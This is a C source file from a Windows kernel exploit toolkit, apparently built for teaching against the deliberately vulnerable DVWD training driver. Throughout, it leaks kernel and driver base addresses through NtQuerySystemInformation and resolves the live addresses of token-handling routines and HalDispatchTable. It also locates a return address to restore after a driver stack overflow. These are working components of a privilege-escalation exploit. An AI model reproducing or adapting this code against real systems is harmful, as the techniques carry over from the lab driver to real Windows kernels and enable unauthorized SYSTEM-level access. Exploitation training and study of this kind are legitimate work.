#include <windows.h>
#include <winioctl.h>
#include <Sddl.h>
#include <wchar.h>
#include <stdio.h>
#include "KernelExploit.h"
#include "KernelArch.h"

BOOL CreateChild(PWCHAR Child)
{
    PROCESS_INFORMATION pi;
	  STARTUPINFO si;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if (!CreateProcess(Child, Child, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        return FALSE;

    cmdProcessId = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

VOID GetOSVersion(PDWORD major, PDWORD minor, PDWORD servicePackMajor, PDWORD servicePackMinor)
{
  OSVERSIONINFOEX osver;
  ZeroMemory(&osver, sizeof(OSVERSIONINFOEX));
  osver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  GetVersionEx((OSVERSIONINFO *)&osver);
  if(major)
    *major = osver.dwMajorVersion;
  
  if(minor)
    *minor = osver.dwMinorVersion;

  if(servicePackMajor)
    *servicePackMajor = osver.wServicePackMajor;

  if(servicePackMinor)
    *servicePackMinor = osver.wServicePackMinor;
}



VOID FillMap(PVOID map, ULONG_PTR value, UINT size)
{
  ULONG i;
  ULONG_PTR *uPmap = (ULONG_PTR*)map;
  for(i=0; i<size/sizeof(ULONG_PTR);i++)
    uPmap[i] = value; 
}



KERN_OFFSET_ENTRY *TargetHost = NULL;



typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;



DWORD                       cmdProcessId;
HANDLE                      deviceHandle;
ULONG_PTR                   HalDispatchTable;
PVOID                       hardcodedReturn=NULL;

_PsGetCurrentProcess        PsGetCurrentProcess;
_DbgPrint                   DbgPrint;
_PsReferencePrimaryToken    PsReferencePrimaryToken;
_PsDereferencePrimaryToken  PsDereferencePrimaryToken;
_KeTerminateThread          KeTerminateThread;
_PsLookupProcessByProcessId PsLookupProcessByProcessId;
_ZwTerminateProcess         ZwTerminateProcess;
_ObDereferenceObject        ObDereferenceObject;
_ZwClose                    ZwClose;



FARPROC GetKernAddress(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName)
{
  PUCHAR KernBaseTemp = (PUCHAR)UserKernBase;
  PUCHAR RealKernBaseTemp = (PUCHAR)RealKernelBase;

  PUCHAR temp = (PUCHAR)GetProcAddress(UserKernBase, SymName);
  if(temp == NULL)
	  return NULL;

  return (FARPROC)(temp - KernBaseTemp + RealKernBaseTemp);
}



BOOL GetKernelBaseInfo(PVOID* kernelBase, PVOID* kernelDriverBase, 
                   PCHAR kernelImage, UINT maxSizeKernel, 
                   PCHAR kernelDriverImage, UINT maxSizeDriver)
{
  _NtQuerySystemInformation NtQuerySystemInformation;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  PSYSTEM_MODULE_INFORMATION_ENTRY pSystemModuleEntry = NULL;
  ULONG i,len;
  NTSTATUS ret;
  HMODULE ntdllHandle;
  

  ntdllHandle = GetModuleHandle(L"ntdll");
  if(!ntdllHandle)
	  return FALSE;

  NtQuerySystemInformation =  (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, "NtQuerySystemInformation");
  if(!NtQuerySystemInformation)
	  return FALSE;

  ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

  ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

  printf("[*] Kernel Executive Entry: %s at %p\n", 
	                   pModuleInfo->Module[0].ImageName,
                     pModuleInfo->Module[0].Base);

  for(i=0; i < pModuleInfo->Count; i++)
  {
      if(strstr(pModuleInfo->Module[i].ImageName, DVWD_DRIVER_NAME))
      {
        // save image and base address of the vulnerable driver
        strcpy_s(kernelDriverImage, maxSizeDriver, pModuleInfo->Module[i].ImageName);
        pSystemModuleEntry = &(pModuleInfo->Module[i]);
              printf("[*] Driver Entry: %s at %p\n", 
	                   pModuleInfo->Module[i].ImageName,
                     pModuleInfo->Module[i].Base);
      }
  }

  strcpy_s(kernelImage, maxSizeKernel, pModuleInfo->Module[0].ImageName);
  *kernelBase = pModuleInfo->Module[0].Base;
  if(pSystemModuleEntry != NULL)
    *kernelDriverBase = pSystemModuleEntry->Base;
  else
    *kernelDriverBase = NULL;

  return TRUE;
}


/* FindRestoreFrameOffset looks for the call TriggerOverflow return address:

- for sake of semplicity and to avoid the reader to do the manual 'analysis' (after changing/recompiling the driver sources) 
  we have exported the "TriggerOverflow" and the "DvwdHandleIoctlStackOverflow" functions to be able to easily 
  and dynamically get the right frame address

- usually Windows drivers functions are not exported but this is not a big deal since the drivers
  are distributed in binary form only. In this case we just need to manually find the hardcoded offset once

- keep in mind also that the compiler auto-inline feature can somehow break the original functions chaining

NTSTATUS __declspec(dllexport) DvwdHandleIoctlStackOverflow(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp) 
{ 
...
...

00000000001D5286 8B 52 10         mov         edx,dword ptr [rdx+10h] 
00000000001D5289 E8 3A FF FF FF   call        TriggerOverflow (1D51C8h) 
00000000001D528E 48 83 C4 28      add         rsp,28h                     <-- this address
00000000001D5292 C3               ret 
...
...

Pattern: call / add / ret  

 */

#define CALL_REL_OP     0xE8 
#define ADD_OP          0x48
#define RET_OP          0xC3

ULONG FindRestoreFrameOffset(PCHAR DriverImage)
{
  PUCHAR base; 
  UINT i;
  PVOID TriggerOverflowFunc;
  PVOID DvwdHandleIoctlStackOverflowFunc;

  HMODULE mod = LoadLibraryA(DriverImage);
  if(mod == NULL)
    return 0;

  TriggerOverflowFunc = GetProcAddress(mod, "TriggerOverflow");
  DvwdHandleIoctlStackOverflowFunc = GetProcAddress(mod, "DvwdHandleIoctlStackOverflow");

  base = (PUCHAR)DvwdHandleIoctlStackOverflowFunc;
  for(i=0; i<255; i++,base++)
  {
    if(  *(base) == CALL_REL_OP && *(base + 5) == ADD_OP && *(base + 9) == RET_OP )
      return (ULONG)((base + 5) - (PUCHAR)mod);
  }

  return 0;
}



BOOL LoadAndGetKernelBase() 
{

  CHAR kFullName[256];
  CHAR kDriverFullName[256];
  PVOID kBase=NULL;
  PVOID kDriverBase=NULL;
  LPSTR kName;
  HMODULE NTosHandle;
  BOOL ret;
  ULONG off;

  memset(kFullName, 0x00, sizeof(kFullName));
  memset(kDriverFullName, 0x00, sizeof(kDriverFullName));
  ret = GetKernelBaseInfo(&kBase, &kDriverBase, kFullName, sizeof(kFullName)-1, kDriverFullName, sizeof(kDriverFullName)-1);
  if(!ret)
	  return FALSE;

  kName = strrchr(kFullName, '\\');
  NTosHandle = LoadLibraryA(++kName);

  if(NTosHandle == NULL)
	  return 0;

  PsGetCurrentProcess         = (_PsGetCurrentProcess)GetKernAddress(NTosHandle, kBase, "PsGetCurrentProcess");
  DbgPrint                    = (_DbgPrint)GetKernAddress(NTosHandle, kBase, "DbgPrint");
  PsReferencePrimaryToken     = (_PsReferencePrimaryToken)GetKernAddress(NTosHandle, kBase, "PsReferencePrimaryToken");
  PsDereferencePrimaryToken   = (_PsDereferencePrimaryToken)GetKernAddress(NTosHandle, kBase, "PsDereferencePrimaryToken");
  PsLookupProcessByProcessId  = (_PsLookupProcessByProcessId)GetKernAddress(NTosHandle, kBase, "PsLookupProcessByProcessId");
  ZwTerminateProcess          = (_ZwTerminateProcess)GetKernAddress(NTosHandle, kBase, "ZwTerminateProcess");
  ObDereferenceObject         = (_ObDereferenceObject)GetKernAddress(NTosHandle, kBase, "ObDereferenceObject");
  ZwClose                     = (_ZwClose)GetKernAddress(NTosHandle, kBase, "ZwClose");
  HalDispatchTable            = (ULONG_PTR)GetKernAddress(NTosHandle, kBase, "HalDispatchTable");

  if(!PsGetCurrentProcess || !DbgPrint || !PsReferencePrimaryToken  || !PsDereferencePrimaryToken ||
	 !PsLookupProcessByProcessId || !ZwTerminateProcess || !ObDereferenceObject || !ZwClose || !HalDispatchTable)
	 return FALSE;


  /* 
     - test if we are able to get Driver base address and relative function offset
     - used in --exploit-stack-overflow-64 module
   */
  if(kDriverBase != NULL && (off = FindRestoreFrameOffset(kDriverFullName)) != 0)
    hardcodedReturn = (PUCHAR)kDriverBase + off;
  
  return TRUE;
}

